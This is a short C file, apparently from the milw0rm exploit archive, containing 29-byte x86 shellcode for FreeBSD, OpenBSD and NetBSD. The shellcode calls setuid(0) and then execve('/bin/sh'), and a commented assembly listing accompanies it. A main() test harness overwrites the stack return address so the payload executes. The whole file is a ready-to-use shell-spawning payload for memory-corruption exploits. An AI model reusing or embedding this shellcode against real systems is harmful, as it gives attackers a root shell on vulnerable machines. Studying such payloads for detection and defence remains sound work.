/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   29 bytes.

   -setuid(0);
   -execve(/bin/sh);
*/

char shellcode[]=

   "\x31\xc0"                      // xor          %eax,%eax
   "\x50"                          // push         %eax
   "\xb0\x17"                      // mov          $0x17,%al
   "\x50"                          // push         %eax
   "\xcd\x80"                      // int          $0x80
   "\x50"                          // push         %eax
   "\x68\x6e\x2f\x73\x68"          // push         $0x68732f6e
   "\x68\x2f\x2f\x62\x69"          // push         $0x69622f2f
   "\x89\xe3"                      // mov          %esp,%ebx
   "\x50"                          // push         %eax
   "\x54"                          // push         %esp
   "\x53"                          // push         %ebx
   "\x50"                          // push         %eax
   "\xb0\x3b"                      // mov          $0x3b,%al
   "\xcd\x80";                     // int          $0x80

main()
{
   int *ret;
   printf("Shellcode lenght=%d\n",sizeof(shellcode));
   ret=(int*)&ret+2;
   (*ret)=(int)shellcode;
}

// milw0rm.com [2004-09-26]